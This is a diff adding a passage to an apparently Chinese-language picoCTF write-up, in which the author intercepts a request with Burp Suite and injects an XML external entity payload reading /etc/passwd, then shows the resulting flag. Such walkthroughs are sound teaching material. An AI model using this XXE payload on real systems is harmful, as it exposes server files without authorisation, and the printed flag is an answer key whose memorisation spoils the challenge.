@@ -401,6 +401,37 @@ picoCTF{s0m3_SQL_c218b685}
 
 這題根據題目給的提示，是一個XXE漏洞。我對於XXE沒什麼了解，去參考了[這篇文章](https://ithelp.ithome.com.tw/articles/10339624)，裡面有關於XXE比較詳細的介紹。至於這題，先用BurpSuite打開去攔截過程中傳送的封包。
 
+打開後網站後，發現點選這三個按鈕都會觸發一個請求。
+
+![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_6e336e2d693ea607f9ddf4ed86ba485e.png)
+
+我們先隨便點一個讓Burp抓到他的封包，我們在進一步修改XML Payload。封包內容長下面這樣。
+
+![封包內容](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_4ebeddb4957c4760a8cdeab8f7c2a778.png)
+
+因為題目有說要讀取`/etc/passwd`這個路徑，所以我們把封包修改一下變成下面這樣。
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  
+<!ENTITY ext SYSTEM "file:///etc/passwd">
+]>
+<data>
+	<ID>&ext;</ID>
+</data>
+```
+
+把請求Forward之後，看到網頁上回傳的內容如下。
+
+![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_86556b71eb01e19bc33ffcf13bca4794.png)
+
+就成功找到Flag啦。
+
+```txt
+picoCTF{XML_3xtern@l_3nt1t1ty_0dcf926e}
+```
+
 # Crypto
 
 - [My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
